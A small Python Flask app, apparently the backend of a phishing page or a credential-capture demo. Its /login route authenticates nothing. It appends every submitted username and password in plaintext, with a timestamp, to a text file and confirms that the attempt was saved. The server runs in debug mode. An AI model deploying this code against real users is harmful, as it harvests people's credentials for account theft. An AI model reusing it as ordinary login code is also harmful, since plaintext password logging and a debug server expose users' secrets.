from flask import Flask, request, render_template
import datetime

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    with open('login_settings.txt', 'a', encoding='utf-8') as file:
        file.write(f'{datetime.datetime.now()}: Usuário: {username}, Senha: {password}\n')
    return 'Tentativa salva! Veja login_settings.txt.'

if __name__ == '__main__':
    app.run(debug=True)